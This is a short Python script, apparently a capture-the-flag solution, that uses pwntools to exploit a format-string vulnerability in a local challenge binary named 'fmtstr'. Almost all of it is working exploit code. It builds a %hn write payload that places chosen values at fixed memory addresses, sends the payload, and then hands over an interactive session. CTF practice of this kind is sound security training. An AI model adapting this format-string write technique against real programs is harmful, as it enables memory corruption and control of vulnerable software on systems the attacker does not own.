from pwn import *

binary = "./fmtstr_patched" if len(sys.argv) > 1 and '-p' in sys.argv else "./fmtstr"

chall = process(binary)

sus_1 = bytes.fromhex("404062")[::-1] + b'\x00' * 5 #(8 bytes)
sus_2 = bytes.fromhex("404060")[::-1] + b'\x00' * 5 #(8 bytes)

val_1 = int("6761", 16)
val_2 = int("6c66", 16)

payload = b'%' + str(val_1).encode() + b'c%18$hn' + b'%' + str(val_2 - val_1).encode() + b'c%19$hn'
payload += ((8 - len(payload) % 8) % 8) * b'\x00' #(Fit the frame)
payload += sus_1 + sus_2

chall.sendlineafter(b'?\n', payload)
chall.interactive()